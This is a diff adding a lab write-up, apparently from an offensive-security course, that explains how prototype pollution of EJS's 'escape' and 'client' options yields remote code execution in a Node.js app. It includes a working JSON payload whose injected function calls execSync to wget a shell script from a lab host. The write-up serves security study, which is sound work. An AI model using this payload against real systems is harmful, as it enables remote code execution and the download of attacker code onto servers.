@@ -107,3 +107,23 @@ Obtain a shell.
 ### Extra Mile
 
 Earlier, we used the escape variable to detect if the target is running EJS. We can also use this variable to obtain RCE with some additional payload modifications. Find how to obtain RCE by polluting the escape variable.
+
+The one turned out to be pretty simple, really just had to use the debugger and step through the code line by line from the point of error.  
+On line 625 in ***node_modules/ejs/lib/ejs.js*** there is the following logic:  
+```js
+if (opts.client) {
+  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
+  if (opts.compileDebug) {
+    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
+  }
+}
+```
+Basically by stepping through the code with the debugger, client was set to false so the proto pollution of ***escape*** completely jumped of this line of code.  
+Naturally then I made the logic of the if statement evaluate to true by adding a ***client*** property.  
+So the json payload looks like:  
+```json
+"__proto__" : {
+  "client": "true",
+  "escape":"function(x){process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.154/shell.sh');}"
+}
+``` 
